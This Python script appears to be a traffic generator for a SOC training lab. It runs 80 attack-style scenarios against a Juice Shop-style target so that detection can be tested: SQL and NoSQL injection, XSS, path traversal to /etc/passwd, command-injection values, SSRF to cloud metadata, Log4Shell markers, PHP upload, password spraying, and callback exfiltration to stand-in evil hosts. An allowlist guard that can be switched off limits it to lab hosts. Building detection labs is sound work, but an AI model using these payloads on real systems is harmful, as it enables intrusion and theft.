#!/usr/bin/env python3
import argparse
import json
import os
import subprocess
import sys
import time
import urllib.parse
import urllib.request
from typing import Dict, List, Optional

TARGET = os.environ.get("TARGET", "http://soc_gateway").rstrip("/")
TARGET_HOST = os.environ.get("TARGET_HOST", "soc_gateway")
TARGET_PORT = int(os.environ.get("TARGET_PORT", "80"))
SAFE_MODE = os.environ.get("SAFE_MODE", "true").lower() != "false"
ALLOW_EXTERNAL_TARGETS = os.environ.get("ALLOW_EXTERNAL_TARGETS", "false").lower() == "true"
DELAY = float(os.environ.get("SCENARIO_DELAY", "0.05"))
MAX_BURST = int(os.environ.get("MAX_BURST", "20"))
ALLOWED_HOSTS = {"soc_gateway", "gateway", "localhost", "127.0.0.1", "soc_juice_shop", "juice-shop"}

SCENARIOS = [
  {
    "id": "01",
    "category": "baseline",
    "name": "baseline home page",
    "actions": [
      "GET /",
      "GET /#/",
      "GET /favicon.ico"
    ]
  },
  {
    "id": "02",
    "category": "baseline",
    "name": "health and gateway endpoints",
    "actions": [
      "GET /__gateway_health__",
      "GET /robots.txt",
      "GET /sitemap.xml"
    ]
  },
  {
    "id": "03",
    "category": "baseline",
    "name": "static asset crawl",
    "actions": [
      "GET /assets/public/images/products/apple_juice.jpg",
      "GET /main.js",
      "GET /styles.css"
    ]
  },
  {
    "id": "04",
    "category": "baseline",
    "name": "robots sitemap discovery",
    "actions": [
      "GET /robots.txt",
      "GET /sitemap.xml",
      "GET /security.txt"
    ]
  },
  {
    "id": "05",
    "category": "baseline",
    "name": "normal product search",
    "actions": [
      "GET /rest/products/search?q=apple",
      "GET /rest/products/search?q=juice"
    ]
  },
  {
    "id": "06",
    "category": "recon",
    "name": "ICMP and TCP connectivity",
    "actions": [
      "CMD ping -c 2 {host}",
      "CMD nc -vz {host} {port}"
    ]
  },
  {
    "id": "07",
    "category": "recon",
    "name": "DNS lookup service names",
    "actions": [
      "CMD nslookup {host}",
      "CMD nslookup soc_gateway",
      "CMD nslookup soc_juice_shop"
    ]
  },
  {
    "id": "08",
    "category": "recon",
    "name": "selected port scan",
    "actions": [
      "CMD nmap -sT -Pn -T2 -p 80,443,3000,8080,9200,55000 {host}"
    ]
  },
  {
    "id": "09",
    "category": "recon",
    "name": "HTTP NSE enumeration",
    "actions": [
      "CMD nmap -sT -sV --script http-title,http-headers,http-methods -p {port} {host}"
    ]
  },
  {
    "id": "10",
    "category": "recon",
    "name": "internal TCP connect checks",
    "actions": [
      "CMD nc -vz {host} 80",
      "CMD nc -vz {host} 443",
      "CMD nc -vz {host} 3000"
    ]
  },
  {
    "id": "11",
    "category": "http",
    "name": "HTTP OPTIONS enumeration",
    "actions": [
      "OPTIONS /",
      "OPTIONS /api",
      "OPTIONS /rest/user/login"
    ]
  },
  {
    "id": "12",
    "category": "http",
    "name": "uncommon HTTP methods",
    "actions": [
      "METHOD PROPFIND /",
      "METHOD TRACE /",
      "METHOD DEBUG /",
      "METHOD TRACK /"
    ]
  },
  {
    "id": "13",
    "category": "headers",
    "name": "security header probe",
    "actions": [
      "GET /|H:X-SOC-Header-Check=true",
      "GET /login|H:X-Requested-With=XMLHttpRequest"
    ]
  },
  {
    "id": "14",
    "category": "headers",
    "name": "Host header override",
    "actions": [
      "GET /|H:Host=admin.internal",
      "GET /|H:Host=localhost",
      "GET /|H:Host=127.0.0.1"
    ]
  },
  {
    "id": "15",
    "category": "headers",
    "name": "forwarded header spoofing",
    "actions": [
      "GET /|H:X-Forwarded-For=127.0.0.1",
      "GET /|H:X-Real-IP=127.0.0.1",
      "GET /|H:X-Forwarded-Host=admin.internal"
    ]
  },
  {
    "id": "16",
    "category": "discovery",
    "name": "sensitive file probe",
    "actions": [
      "GET /.env",
      "GET /config.php",
      "GET /config.json",
      "GET /db.sql"
    ]
  },
  {
    "id": "17",
    "category": "discovery",
    "name": "source-control artifact probe",
    "actions": [
      "GET /.git/config",
      "GET /.svn/entries",
      "GET /.hg/hgrc",
      "GET /.bzr/branch/branch.conf"
    ]
  },
  {
    "id": "18",
    "category": "discovery",
    "name": "backup and archive probe",
    "actions": [
      "GET /backup.zip",
      "GET /backup.tar.gz",
      "GET /dump.sql",
      "GET /database.bak"
    ]
  },
  {
    "id": "19",
    "category": "discovery",
    "name": "admin panel discovery",
    "actions": [
      "GET /admin",
      "GET /administrator",
      "GET /manage",
      "GET /manager/html"
    ]
  },
  {
    "id": "20",
    "category": "discovery",
    "name": "debug metrics actuator discovery",
    "actions": [
      "GET /debug",
      "GET /metrics",
      "GET /server-status",
      "GET /actuator/env",
      "GET /actuator/health"
    ]
  },
  {
    "id": "21",
    "category": "api",
    "name": "API root discovery",
    "actions": [
      "GET /api",
      "GET /api/v1",
      "GET /api/v2",
      "GET /rest",
      "GET /rest/products/search?q=test"
    ]
  },
  {
    "id": "22",
    "category": "api",
    "name": "Swagger and OpenAPI discovery",
    "actions": [
      "GET /swagger",
      "GET /swagger-ui",
      "GET /swagger.json",
      "GET /openapi.json",
      "GET /api-docs"
    ]
  },
  {
    "id": "23",
    "category": "api",
    "name": "GraphQL GET markers",
    "actions": [
      "GET /graphql",
      "GET /graphql?query=%7B__typename%7D"
    ]
  },
  {
    "id": "24",
    "category": "api",
    "name": "GraphQL introspection POST marker",
    "actions": [
      "JSON /graphql {\"query\":\"{__schema{types{name}}}\"}"
    ]
  },
  {
    "id": "25",
    "category": "discovery",
    "name": "small directory fuzzing",
    "actions": [
      "WORDLIST_GET /opt/soc/wordlists/paths-small.txt 30"
    ]
  },
  {
    "id": "26",
    "category": "discovery",
    "name": "extension sweep",
    "actions": [
      "GET /index.php",
      "GET /index.jsp",
      "GET /index.asp",
      "GET /login.php",
      "GET /admin.aspx"
    ]
  },
  {
    "id": "27",
    "category": "web",
    "name": "path normalization anomalies",
    "actions": [
      "GET //admin//..//login",
      "GET /admin/%2e%2e/login",
      "GET /assets/./../robots.txt"
    ]
  },
  {
    "id": "28",
    "category": "traversal",
    "name": "encoded path traversal",
    "actions": [
      "GET /%2e%2e/%2e%2e/%2e%2e/etc/passwd",
      "GET /..%252f..%252f..%252fetc%252fpasswd",
      "GET /%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
    ]
  },
  {
    "id": "29",
    "category": "traversal",
    "name": "Linux LFI traversal",
    "actions": [
      "GET /../../../../etc/passwd",
      "GET /?file=../../../../etc/passwd",
      "GET /download?file=../../../../etc/passwd"
    ]
  },
  {
    "id": "30",
    "category": "traversal",
    "name": "Windows LFI traversal",
    "actions": [
      "GET /?file=..\\..\\windows\\win.ini",
      "GET /download?path=C:\\Windows\\win.ini",
      "GET /..\\..\\..\\boot.ini"
    ]
  },
  {
    "id": "31",
    "category": "traversal",
    "name": "PHP wrapper LFI markers",
    "actions": [
      "GET /?page=php://filter/convert.base64-encode/resource=index.php",
      "GET /?file=data://text/plain;base64,SGVsbG8=",
      "GET /?include=expect://id"
    ]
  },
  {
    "id": "32",
    "category": "sqli",
    "name": "classic SQL injection markers",
    "actions": [
      "GET /rest/products/search?q=' OR '1'='1",
      "GET /rest/products/search?q=admin'--",
      "GET /rest/products/search?q=' OR 1=1--"
    ]
  },
  {
    "id": "33",
    "category": "sqli",
    "name": "boolean SQL injection markers",
    "actions": [
      "GET /rest/products/search?q=1 AND 1=1",
      "GET /rest/products/search?q=1 AND 1=2",
      "GET /rest/products/search?q=' AND 'a'='a"
    ]
  },
  {
    "id": "34",
    "category": "sqli",
    "name": "UNION SQL injection markers",
    "actions": [
      "GET /rest/products/search?q=1 UNION SELECT NULL",
      "GET /rest/products/search?q=-1 UNION ALL SELECT username,password FROM users"
    ]
  },
  {
    "id": "35",
    "category": "sqli",
    "name": "time-delay SQL injection markers",
    "actions": [
      "GET /rest/products/search?q=1 AND SLEEP(1)",
      "GET /rest/products/search?q=1;SELECT pg_sleep(1)",
      "GET /rest/products/search?q=1 WAITFOR DELAY '0:0:1'"
    ]
  },
  {
    "id": "36",
    "category": "sqli",
    "name": "encoded SQL injection markers",
    "actions": [
      "GET /rest/products/search?q=%27%20OR%20%271%27%3D%271",
      "GET /rest/products/search?q=%2527%2520OR%25201%253D1--"
    ]
  },
  {
    "id": "37",
    "category": "nosqli",
    "name": "NoSQL operator login marker",
    "actions": [
      "JSON /rest/user/login {\"email\":{\"$ne\":null},\"password\":{\"$ne\":null}}"
    ]
  },
  {
    "id": "38",
    "category": "nosqli",
    "name": "NoSQL regex body marker",
    "actions": [
      "JSON /rest/user/login {\"email\":\"admin@example.com\",\"password\":{\"$regex\":\".*\"}}"
    ]
  },
  {
    "id": "39",
    "category": "xss",
    "name": "script XSS markers",
    "actions": [
      "GET /search?q=<script>alert(1)</script>",
      "GET /search?q=\"><script>alert(document.domain)</script>"
    ]
  },
  {
    "id": "40",
    "category": "xss",
    "name": "event handler XSS markers",
    "actions": [
      "GET /search?q=<img src=x onerror=alert(1)>",
      "GET /search?q=<body onload=alert(1)>",
      "GET /search?q=<details open ontoggle=alert(1)>"
    ]
  },
  {
    "id": "41",
    "category": "xss",
    "name": "SVG and MathML XSS markers",
    "actions": [
      "GET /search?q=<svg onload=alert(1)>",
      "GET /search?q=<math href=javascript:alert(1)>"
    ]
  },
  {
    "id": "42",
    "category": "injection",
    "name": "template injection markers",
    "actions": [
      "GET /search?q={{7*7}}",
      "GET /search?q=${7*7}",
      "GET /search?q=<%= 7*7 %>",
      "GET /search?q=#{7*7}"
    ]
  },
  {
    "id": "43",
    "category": "cmdi",
    "name": "command injection separator markers",
    "actions": [
      "GET /search?q=test;id",
      "GET /search?q=test|whoami",
      "GET /search?q=test&&uname -a",
      "GET /search?q=test`id`",
      "GET /search?q=test$(whoami)"
    ]
  },
  {
    "id": "44",
    "category": "cmdi",
    "name": "command injection JSON body markers",
    "actions": [
      "JSON /api/ping {\"host\":\"127.0.0.1; cat /etc/passwd\"}",
      "JSON /api/ping {\"host\":\"8.8.8.8 | id\"}",
      "JSON /api/ping {\"host\":\"localhost && whoami\"}"
    ]
  },
  {
    "id": "45",
    "category": "ssrf",
    "name": "SSRF localhost markers",
    "actions": [
      "GET /api/fetch?url=http://127.0.0.1:80",
      "GET /api/fetch?url=http://localhost:80",
      "GET /api/fetch?url=http://[::1]:80"
    ]
  },
  {
    "id": "46",
    "category": "ssrf",
    "name": "cloud metadata SSRF markers",
    "actions": [
      "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/",
      "GET /api/fetch?url=http://metadata.google.internal/computeMetadata/v1/",
      "GET /api/fetch?url=http://100.100.100.200/latest/meta-data/"
    ]
  },
  {
    "id": "47",
    "category": "ssrf",
    "name": "internal hostname SSRF markers",
    "actions": [
      "GET /api/fetch?url=http://soc_gateway:80",
      "GET /api/fetch?url=http://juice-shop:3000",
      "GET /api/fetch?url=http://wazuh.manager:55000"
    ]
  },
  {
    "id": "48",
    "category": "ua",
    "name": "scanner User-Agent set",
    "actions": [
      "AGENTS /opt/soc/wordlists/agents.txt /"
    ]
  },
  {
    "id": "49",
    "category": "ua",
    "name": "suspicious scanner headers",
    "actions": [
      "GET /login|H:User-Agent=curl/7.88 exploit-test",
      "GET /login|H:User-Agent=ZmEu",
      "GET /login|H:User-Agent=python-requests exploit probe"
    ]
  },
  {
    "id": "50",
    "category": "exploit-marker",
    "name": "Shellshock header marker",
    "actions": [
      "GET /cgi-bin/status|H:User-Agent=() { :;}; echo soclab"
    ]
  },
  {
    "id": "51",
    "category": "exploit-marker",
    "name": "Log4Shell header marker",
    "actions": [
      "GET /|H:X-Api-Version=${jndi:ldap://127.0.0.1/a}",
      "GET /|H:User-Agent=${jndi:dns://soclab.invalid/a}"
    ]
  },
  {
    "id": "52",
    "category": "exploit-marker",
    "name": "Spring4Shell marker",
    "actions": [
      "POST /api/form application/x-www-form-urlencoded class.module.classLoader.resources.context.parent.pipeline.first.pattern=soclab"
    ]
  },
  {
    "id": "53",
    "category": "exploit-marker",
    "name": "Java serialization marker",
    "actions": [
      "POST /api/deserialize application/octet-stream rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
      "POST /api/deserialize text/plain aced0005737200116a6176612e7574696c2e486173684d6170"
    ]
  },
  {
    "id": "54",
    "category": "exploit-marker",
    "name": "PHP serialization marker",
    "actions": [
      "POST /api/import text/plain O:8:\"stdClass\":1:{s:4:\"test\";s:6:\"soclab\";}"
    ]
  },
  {
    "id": "55",
    "category": "xml",
    "name": "XXE marker",
    "actions": [
      "POST /api/xml application/xml <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><foo>&xxe;</foo>"
    ]
  },
  {
    "id": "56",
    "category": "xml",
    "name": "SOAP XML marker",
    "actions": [
      "POST /soap application/xml <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Body><test>soclab</test></soapenv:Body></soapenv:Envelope>"
    ]
  },
  {
    "id": "57",
    "category": "headers",
    "name": "CRLF injection markers",
    "actions": [
      "GET /redirect?next=%0d%0aSet-Cookie:%20soclab=1",
      "GET /download?file=test%0D%0AX-Injected:%20yes"
    ]
  },
  {
    "id": "58",
    "category": "headers",
    "name": "request smuggling marker headers",
    "actions": [
      "POST /api/check text/plain soclab|H:Transfer-Encoding=chunked|H:Content-Length=4"
    ]
  },
  {
    "id": "59",
    "category": "headers",
    "name": "cache poisoning headers",
    "actions": [
      "GET /|H:X-Forwarded-Host=evil.example.invalid",
      "GET /|H:X-Original-URL=/admin",
      "GET /|H:X-Rewrite-URL=/admin"
    ]
  },
  {
    "id": "60",
    "category": "headers",
    "name": "CORS preflight probes",
    "actions": [
      "OPTIONS /api|H:Origin=https://evil.example.invalid|H:Access-Control-Request-Method=POST|H:Access-Control-Request-Headers=authorization,content-type",
      "OPTIONS /rest/user/login|H:Origin=null|H:Access-Control-Request-Method=POST"
    ]
  },
  {
    "id": "61",
    "category": "web",
    "name": "open redirect markers",
    "actions": [
      "GET /redirect?next=http://evil.example.invalid",
      "GET /redirect?url=//evil.example.invalid",
      "GET /redirect?redirect=https://evil.example.invalid/login"
    ]
  },
  {
    "id": "62",
    "category": "auth",
    "name": "JWT none algorithm marker",
    "actions": [
      "GET /api/profile|H:Authorization=Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiJ0ZXN0In0."
    ]
  },
  {
    "id": "63",
    "category": "auth",
    "name": "invalid admin JWT marker",
    "actions": [
      "GET /api/admin|H:Authorization=Bearer invalid.invalid.invalid",
      "GET /api/admin|H:Authorization=Bearer eyJyb2xlIjoiYWRtaW4ifQ.invalid.sig"
    ]
  },
  {
    "id": "64",
    "category": "auth",
    "name": "cookie tampering markers",
    "actions": [
      "GET /profile|H:Cookie=role=admin",
      "GET /profile|H:Cookie=isAdmin=true",
      "GET /profile|H:Cookie=debug=true"
    ]
  },
  {
    "id": "65",
    "category": "auth",
    "name": "session fixation marker",
    "actions": [
      "GET /login|H:Cookie=session=fixed-session-id-soclab",
      "POST /rest/user/login application/json {\"email\":\"demo@example.com\",\"password\":\"wrong\"}|H:Cookie=session=fixed-session-id-soclab"
    ]
  },
  {
    "id": "66",
    "category": "api",
    "name": "mass assignment markers",
    "actions": [
      "JSON /api/user/update {\"email\":\"demo@example.com\",\"role\":\"admin\",\"isAdmin\":true}",
      "JSON /api/profile {\"id\":1,\"balance\":999999,\"verified\":true}"
    ]
  },
  {
    "id": "67",
    "category": "api",
    "name": "prototype pollution marker",
    "actions": [
      "POST /api/settings application/json {\"__proto__\":{\"polluted\":\"yes\"},\"constructor\":{\"prototype\":{\"admin\":true}}}"
    ]
  },
  {
    "id": "68",
    "category": "upload",
    "name": "PHP upload marker",
    "actions": [
      "UPLOAD /file-upload shell.php application/x-php <?php echo \"soclab\"; ?>"
    ]
  },
  {
    "id": "69",
    "category": "upload",
    "name": "double extension upload markers",
    "actions": [
      "UPLOAD /file-upload image.jpg.php application/x-php <?php echo \"soclab\"; ?>",
      "UPLOAD /file-upload avatar.png%00.php application/x-php marker"
    ]
  },
  {
    "id": "70",
    "category": "upload",
    "name": "suspicious upload name markers",
    "actions": [
      "UPLOAD /file-upload ..%2fwebshell.jsp application/octet-stream soclab",
      "UPLOAD /file-upload report.pdf;.php application/octet-stream soclab"
    ]
  },
  {
    "id": "71",
    "category": "auth",
    "name": "login failure burst capped",
    "actions": [
      "LOGIN admin@example.com wrong 12"
    ]
  },
  {
    "id": "72",
    "category": "auth",
    "name": "password spraying capped",
    "actions": [
      "SPRAY Password123 /opt/soc/wordlists/users.txt 8"
    ]
  },
  {
    "id": "73",
    "category": "auth",
    "name": "password guessing capped",
    "actions": [
      "GUESS demo@example.com /opt/soc/wordlists/passwords.txt 12"
    ]
  },
  {
    "id": "74",
    "category": "auth",
    "name": "credential stuffing fake capped",
    "actions": [
      "STUFF /opt/soc/wordlists/users.txt /opt/soc/wordlists/passwords.txt 8"
    ]
  },
  {
    "id": "75",
    "category": "rate",
    "name": "API rate-limit burst capped",
    "actions": [
      "BURST /api 20",
      "BURST /rest/products/search?q=burst 20"
    ]
  },
  {
    "id": "76",
    "category": "egress",
    "name": "callback URL exfil markers",
    "actions": [
      "GET /api/export?callback=http://attacker.example.invalid/collect",
      "GET /api/report?webhook=https://evil.example.invalid/hook"
    ]
  },
  {
    "id": "77",
    "category": "egress",
    "name": "base64 exfil marker",
    "actions": [
      "POST /api/log text/plain c29jbGFiLWZha2UtZXhmaWwtbWFya2Vy"
    ]
  },
  {
    "id": "78",
    "category": "egress",
    "name": "fake C2 beacon markers",
    "actions": [
      "GET /beacon|H:X-C2-Checkin=soclab-demo",
      "POST /api/telemetry application/json {\"beacon\":\"soclab\",\"interval\":60,\"host\":\"demo\"}"
    ]
  },
  {
    "id": "79",
    "category": "recon",
    "name": "internal service connect checks",
    "actions": [
      "CMD nc -vz soc_gateway 80",
      "CMD nc -vz soc_juice_shop 3000",
      "CMD nc -vz single-node-wazuh.manager-1 55000"
    ]
  },
  {
    "id": "80",
    "category": "baseline",
    "name": "normal baseline comparison traffic",
    "actions": [
      "GET /",
      "GET /rest/products/search?q=banana",
      "GET /assets/public/images/products/banana_juice.jpg",
      "GET /#/login"
    ]
  }
]
SCENARIO_MAP = {s["id"]: s for s in SCENARIOS}

def guard_target():
    parsed = urllib.parse.urlparse(TARGET)
    host = parsed.hostname or ""
    if SAFE_MODE and not ALLOW_EXTERNAL_TARGETS and host not in ALLOWED_HOSTS:
        print(f"[blocked] TARGET={TARGET!r} is outside the lab allowlist. Keep target inside the SOC lab network.", file=sys.stderr)
        sys.exit(2)

def quote_url_path(path: str) -> str:
    return urllib.parse.quote(path, safe="/%?=&:;,+@$'()[]{}*.-_~#\\%|<>`\"")

def full_url(path: str) -> str:
    if path.startswith("http://") or path.startswith("https://"):
        return path
    if not path.startswith("/"):
        path = "/" + path
    return TARGET + quote_url_path(path)

def parse_headers(parts: List[str]) -> Dict[str, str]:
    headers = {}
    for p in parts:
        if p.startswith("H:") and "=" in p:
            k, v = p[2:].split("=", 1)
            headers[k] = v
    return headers

def request(method: str, path: str, scenario_id: str, headers: Optional[dict] = None, body: Optional[bytes] = None, timeout: float = 3.0, dry_run: bool = False):
    h = {
        "User-Agent": "soc-attacker-v3-safe-simulator",
        "X-SOC-Scenario": f"SOCV3-{scenario_id}",
        "X-SOC-Lab": "traffic-simulation-only",
    }
    if headers:
        h.update(headers)
    target = full_url(path)
    if dry_run:
        print(f"DRY {method} {target} headers={h} body_len={0 if body is None else len(body)}")
        return
    try:
        req = urllib.request.Request(target, data=body, headers=h, method=method)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            resp.read(256)
            print(f"{method} {target} -> {resp.status}")
    except Exception as e:
        print(f"{method} {target} -> {type(e).__name__}: {e}")
    time.sleep(DELAY)

def marker(scenario_id: str, name: str, dry_run: bool = False):
    safe_name = urllib.parse.quote(name.replace(" ", "-"), safe="")
    request("GET", f"/__soc_attack_marker__?scenario={scenario_id}&name={safe_name}", scenario_id, dry_run=dry_run)

def run_cmd(cmd: List[str], dry_run: bool = False):
    fixed = [c.replace("{host}", TARGET_HOST).replace("{port}", str(TARGET_PORT)) for c in cmd]
    if dry_run:
        print("DRY CMD " + " ".join(fixed))
        return
    try:
        print("CMD " + " ".join(fixed))
        subprocess.run(fixed, timeout=12, check=False)
    except Exception as e:
        print(f"CMD error: {type(e).__name__}: {e}")
    time.sleep(DELAY)

def do_action(action: str, scenario_id: str, dry_run: bool = False):
    if action.startswith("GET "):
        parts = action[4:].split("|")
        request("GET", parts[0], scenario_id, headers=parse_headers(parts[1:]), dry_run=dry_run)
    elif action.startswith("OPTIONS "):
        parts = action[8:].split("|")
        request("OPTIONS", parts[0], scenario_id, headers=parse_headers(parts[1:]), dry_run=dry_run)
    elif action.startswith("METHOD "):
        _, method, path = action.split(" ", 2)
        request(method, path, scenario_id, dry_run=dry_run)
    elif action.startswith("POST "):
        parts = action[5:].split("|")
        fields = parts[0].split(" ", 2)
        if len(fields) < 3:
            print(f"bad POST action: {action}"); return
        path, content_type, body = fields[0], fields[1], fields[2]
        headers = {"Content-Type": content_type}
        headers.update(parse_headers(parts[1:]))
        request("POST", path, scenario_id, headers=headers, body=body.encode(), dry_run=dry_run)
    elif action.startswith("JSON "):
        path, body = action[5:].split(" ", 1)
        request("POST", path, scenario_id, headers={"Content-Type": "application/json"}, body=body.encode(), dry_run=dry_run)
    elif action.startswith("UPLOAD "):
        _, path, filename, ctype, body = action.split(" ", 4)
        boundary = f"----socv3{scenario_id}boundary"
        payload = (f'--{boundary}\\r\\nContent-Disposition: form-data; name="file"; filename="{filename}"\\r\\nContent-Type: {ctype}\\r\\n\\r\\n{body}\\r\\n--{boundary}--\\r\\n').encode()
        request("POST", path, scenario_id, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}, body=payload, dry_run=dry_run)
    elif action.startswith("CMD "):
        run_cmd(action[4:].split(), dry_run)
    elif action.startswith("WORDLIST_GET "):
        _, path, limit = action.split(" ", 2)
        limit_n = min(int(limit), MAX_BURST)
        try:
            with open(path, "r", encoding="utf-8") as f:
                for item in [x.strip() for x in f if x.strip()][:limit_n]:
                    request("GET", "/" + item.lstrip("/"), scenario_id, dry_run=dry_run)
        except Exception as e:
            print(f"wordlist error: {e}")
    elif action.startswith("AGENTS "):
        _, path, route = action.split(" ", 2)
        try:
            with open(path, "r", encoding="utf-8") as f:
                agents = [x.strip() for x in f if x.strip()]
            for agent in agents[:MAX_BURST]:
                request("GET", route, scenario_id, headers={"User-Agent": agent}, dry_run=dry_run)
        except Exception as e:
            print(f"agents error: {e}")
    elif action.startswith("LOGIN "):
        _, email, password, count = action.split(" ", 3)
        for i in range(min(int(count), MAX_BURST)):
            body = json.dumps({"email": email, "password": f"{password}-{i}"})
            request("POST", "/rest/user/login", scenario_id, headers={"Content-Type": "application/json"}, body=body.encode(), dry_run=dry_run)
    elif action.startswith("SPRAY "):
        _, password, users_file, count = action.split(" ", 3)
        with open(users_file, "r", encoding="utf-8") as f:
            users = [x.strip() for x in f if x.strip()]
        for u in users[:min(int(count), MAX_BURST)]:
            body = json.dumps({"email": u, "password": password})
            request("POST", "/rest/user/login", scenario_id, headers={"Content-Type": "application/json"}, body=body.encode(), dry_run=dry_run)
    elif action.startswith("GUESS "):
        _, email, pw_file, count = action.split(" ", 3)
        with open(pw_file, "r", encoding="utf-8") as f:
            pws = [x.strip() for x in f if x.strip()]
        for p in pws[:min(int(count), MAX_BURST)]:
            body = json.dumps({"email": email, "password": p})
            request("POST", "/rest/user/login", scenario_id, headers={"Content-Type": "application/json"}, body=body.encode(), dry_run=dry_run)
    elif action.startswith("STUFF "):
        _, users_file, pw_file, count = action.split(" ", 3)
        with open(users_file, "r", encoding="utf-8") as f:
            users = [x.strip() for x in f if x.strip()]
        with open(pw_file, "r", encoding="utf-8") as f:
            pws = [x.strip() for x in f if x.strip()]
        for i in range(min(int(count), MAX_BURST, len(users), len(pws))):
            body = json.dumps({"email": users[i], "password": pws[i]})
            request("POST", "/rest/user/login", scenario_id, headers={"Content-Type": "application/json"}, body=body.encode(), dry_run=dry_run)
    elif action.startswith("BURST "):
        _, path, count = action.split(" ", 2)
        for i in range(min(int(count), MAX_BURST)):
            sep = "&" if "?" in path else "?"
            request("GET", f"{path}{sep}burst={i}", scenario_id, dry_run=dry_run)
    else:
        print(f"unknown action: {action}")

def list_scenarios(category: Optional[str] = None):
    for s in SCENARIOS:
        if category and s["category"] != category:
            continue
        print(f"{s['id']}\\t{s['category']:15s}\\t{s['name']}")

def categories():
    for c in sorted({s["category"] for s in SCENARIOS}):
        print(c)

def run_scenario(s, dry_run: bool = False):
    print(f"\\n=== [{s['id']}] {s['name']} ({s['category']}) ===")
    marker(s["id"], s["name"], dry_run)
    for action in s["actions"]:
        try:
            do_action(action, s["id"], dry_run)
        except Exception as e:
            print(f"action error in scenario {s['id']}: {type(e).__name__}: {e}")

def main():
    guard_target()
    p = argparse.ArgumentParser(description="SOC attacker advanced v3 - safe lab traffic generator with 80 scenarios")
    sub = p.add_subparsers(dest="cmd", required=True)
    lp = sub.add_parser("list"); lp.add_argument("--category")
    sub.add_parser("categories")
    rp = sub.add_parser("run"); rp.add_argument("id"); rp.add_argument("--dry-run", action="store_true")
    rap = sub.add_parser("run-all"); rap.add_argument("--dry-run", action="store_true"); rap.add_argument("--from-id"); rap.add_argument("--to-id")
    rcp = sub.add_parser("run-category"); rcp.add_argument("category"); rcp.add_argument("--dry-run", action="store_true")
    args = p.parse_args()
    if args.cmd == "list":
        list_scenarios(args.category)
    elif args.cmd == "categories":
        categories()
    elif args.cmd == "run":
        sid = args.id.zfill(2)
        if sid not in SCENARIO_MAP:
            print(f"unknown scenario: {args.id}", file=sys.stderr); sys.exit(1)
        run_scenario(SCENARIO_MAP[sid], args.dry_run)
    elif args.cmd == "run-all":
        start = args.from_id.zfill(2) if args.from_id else None
        end = args.to_id.zfill(2) if args.to_id else None
        for s in SCENARIOS:
            if start and s["id"] < start:
                continue
            if end and s["id"] > end:
                continue
            run_scenario(s, args.dry_run)
    elif args.cmd == "run-category":
        matched = [s for s in SCENARIOS if s["category"] == args.category]
        if not matched:
            print(f"unknown/empty category: {args.category}", file=sys.stderr)
            sys.exit(1)
        for s in matched:
            run_scenario(s, args.dry_run)

if __name__ == "__main__":
    main()